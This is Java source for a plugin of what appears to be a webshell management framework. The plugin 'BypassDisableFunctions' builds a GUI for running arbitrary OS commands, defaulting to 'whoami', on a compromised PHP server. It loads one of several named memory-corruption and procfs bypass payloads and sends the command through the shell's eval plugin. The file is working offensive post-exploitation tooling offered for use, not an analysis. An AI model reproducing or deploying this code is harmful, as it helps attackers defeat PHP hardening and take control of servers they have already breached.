package shells.plugins.php;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextField;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(Name = "BypassDisableFunctions", payloadName = "PhpDynamicPayload")
public class BypassDisableFunctions implements Plugin {
    private static final String[] BYPASS_MEM_PAYLOAD = {"disfunpoc", "php-json-bypass", "php7-backtrace-bypass", "php7-gc-bypass", "procfs_bypass"};
    private static final String CLASS_NAME = "BypassDisableFunctions.Run";
    private JTextField commandTextField = new JTextField(35);
    private Encoding encoding;
    private JPanel envPanel = new JPanel(new BorderLayout());
    private boolean loadState;
    private JPanel memBypassPanel = new JPanel(new BorderLayout());
    private JLabel memCommandLabel = new JLabel("command");
    private JComboBox<String> memPayloadComboBox = new JComboBox<>(BYPASS_MEM_PAYLOAD);
    private JLabel memPayloadLabel = new JLabel("payload");
    private RTextArea memResultTextArea = new RTextArea();
    private JButton memRunButton = new JButton("Run");
    private JSplitPane memSplitPane = new JSplitPane();
    private JPanel panel = new JPanel(new BorderLayout());
    private Payload payload;
    private PhpEvalCode phpEvalCode;
    private ShellEntity shellEntity;
    private JTabbedPane tabbedPane = new JTabbedPane();

    public BypassDisableFunctions() {
        this.commandTextField.setAutoscrolls(true);
        this.commandTextField.setText("whoami");
        this.memSplitPane.setOrientation(0);
        JPanel memTopPanel = new JPanel();
        memTopPanel.add(this.memPayloadLabel);
        memTopPanel.add(this.memPayloadComboBox);
        memTopPanel.add(this.memCommandLabel);
        memTopPanel.add(this.commandTextField);
        memTopPanel.add(this.memRunButton);
        this.memSplitPane.setTopComponent(memTopPanel);
        this.memSplitPane.setBottomComponent(new JScrollPane(this.memResultTextArea));
        this.memBypassPanel.add(this.memSplitPane);
        this.tabbedPane.addTab("MemBypass", this.memBypassPanel);
        this.tabbedPane.addTab("EnvBypass", this.envPanel);
        this.panel.add(this.tabbedPane);
    }

    private void memRunButtonClick(ActionEvent actionEvent) {
        String codeString = new String(functions.getResourceAsByteArray(this, String.format("shell/php/assets/%s.php", (String) this.memPayloadComboBox.getSelectedItem())));
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("cmd", this.commandTextField.getText());
        this.memResultTextArea.setText(eval(codeString, reqParameter));
    }

    private String eval(String code, ReqParameter reqParameter) {
        if (this.phpEvalCode == null) {
            try {
                if (this.phpEvalCode == null) {
                    this.phpEvalCode = (PhpEvalCode) this.shellEntity.getFrame().getPlugin("P_Eval_Code");
                }
            } catch (Exception e) {
                JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "no find plugin P_Eval_Code!");
                return "";
            }
        }
        return this.phpEvalCode.eval(code, reqParameter);
    }

    @Override 
    public void init(ShellEntity shellEntity2) {
        this.shellEntity = shellEntity2;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override 
    public JPanel getView() {
        return this.panel;
    }
}
